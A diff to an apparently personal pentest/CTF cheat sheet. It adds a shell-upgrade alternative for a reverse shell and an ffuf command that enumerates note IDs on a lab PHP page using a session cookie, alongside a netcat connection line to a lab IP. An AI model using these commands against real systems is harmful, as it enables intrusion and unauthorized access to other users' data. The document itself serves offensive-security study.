@@ -9,12 +9,18 @@ nc -nv 10.10.14.6 4545
 #### Upgrade a rev shell
 ```sh
 $ python -c 'import pty; pty.spawn("/bin/bash")'
+# ou
+$ /usr/bin/script -qc /bin/bash /dev/null
 ^Z
 
 $ stty raw -echo; fg
 $ stty rows 50 columns 200
 $ export TERM=linux
 $ exec /bin/bash
+```
+#### Fuff ID enumeration
+```sh
+$ ffuf -u 'http://172.16.11.37/note.php?id=FUZZ' -b 'PHPSESSID=hurcb449m5j5sl7o49d2hu5nk9' -w <(seq 1 107)
 ```
 #### Mount a image on Linux
 ```sh
